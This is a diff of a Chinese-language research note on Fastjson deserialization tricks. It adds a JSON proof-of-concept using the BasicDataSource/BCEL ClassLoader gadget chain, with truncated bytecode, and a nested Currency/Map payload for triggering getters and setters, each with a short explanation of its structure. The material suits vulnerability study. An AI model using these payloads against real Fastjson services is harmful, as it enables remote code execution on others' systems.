@@ -1,6 +1,6 @@
 # FastJson Trick.md
 
-## parse调用parseObjetc
+## parse调用parseObjetc从而触发setter
 
 Fastjson反序列化的时候所用的是Parse而不是ParseObject，这里就会有一个Trick，就是在原本的@type上再嵌套一层@type，并设置为 '@type':"com.alibaba.fastjson.JSONObject",
 
@@ -23,4 +23,42 @@ Fastjson反序列化的时候所用的是Parse而不是ParseObject，这里就�
 ```
 ## parse触发get另一种思路
 https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358489&idx=1&sn=2d1f600da6f01b644544331a844139ae&chksm=83f0273bb487ae2d85984c541adc7a928bdca396aa6ad3c0c349e2ef044558539f2f7075ad1f&mpshare=1&scene=23&srcid=1123yB78GUjwHduKmaU9BGSa&sharer_sharetime=1637650532436&sharer_shareid=18ef5175242004180f2ee4dd9c244e8a#rd
+```
+{
+    {
+        "x":{
+                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
+        }
+    }: "x"
+}
+```
+这里PoC结构上还有一个值得注意的地方在于，
 
+先是将 {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 "{}"。
+
+之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。
+
+
+## su18师傅分享的一种触发getter/setter思路
+```
+{
+	"@type": "java.util.Currency",
+	"val": {
+		"currency": {
+			"abc": {
+				"@type": "java.util.Map",
+				"aaa": {
+					"@type": "org.su18.fastjson.common.Person",
+					"a": "s",
+					"age": 12,
+					"name": "su18"
+				}
+			}
+		}
+	}
+}
+```
